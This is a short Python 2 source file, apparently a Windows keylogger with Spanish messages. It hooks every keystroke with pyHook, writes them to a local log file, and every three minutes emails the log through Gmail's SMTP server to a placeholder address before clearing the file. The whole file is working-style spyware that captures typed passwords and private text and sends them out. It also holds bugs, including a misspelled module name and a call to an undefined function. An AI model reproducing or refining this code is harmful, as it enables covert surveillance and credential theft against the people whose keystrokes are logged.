import pyHook, pythoncom, sys, logging
import time, datetime

wait_seconds = 180
timeout = time.time() + wait_seconds
file_log = 'C:\\keybaby\\dat.txt'


def TimeOut():
    if time.time() > timeout:
        return True
    else:
        return False
        
def SendEmail(user, pwd, recipient, subject, body):
    import smtplib
    gmail_user = user
    gmail_pass = pwd
    FROM = user
    TO = recipient if type(recipient) is list else [recipient]
    SUBJECT = subject
    TEXT = body
    message = """\From: %s\nTo: %\nSubject: %s\n\n%s""" % (FROM, ", ".join(TO), SUBJECT, TEXT)
    try:
        server = smtlib.SMTP("smtp.gmail.com", 587)
        server.ehlo()
        server.starttls()
        server.login(gmail_user, gmail_pass)
        server.sendmail(FROM, TO, message)
        server.close()
        print 'Correo enviado'
    except:
        print 'Error al enviar'
        
def FormatAndSendLogEmail():
    with open(file_log, 'r+') as f:
        actualdate = datetime.datetime.now().strftime("%Y-%m-%d %H:%M:%S")
        data = f.read().replace('\n', '');
        data = 'Log capturado a las '+ actualdate +'\n' + data
        SendEmail('introducircorreo@gmail.com', 'tuclave', 'tucorreo@gmail.com', 'Nuevo log - '+actualdate, data)
        f.seek(0)
        f.truncate()
        
def OnKeyboardEvent(event):
    logging.basicConfig(filename=file_log, level=logging.DEBUG, format = '%(message)s')
    logging.log(10, chr(event.Ascii))
    return True

hooks_manager = pyHook.HookManager()
hooks_manager.KeyDown = OnKeyboardEvent
hooks_manager.HookKeyboard()

while True:
    if TimeOut():
        FormatAndSendEmail()
        timeout = time.time() + wait_seconds
    pythoncom.PumpWaitingMessages()
        
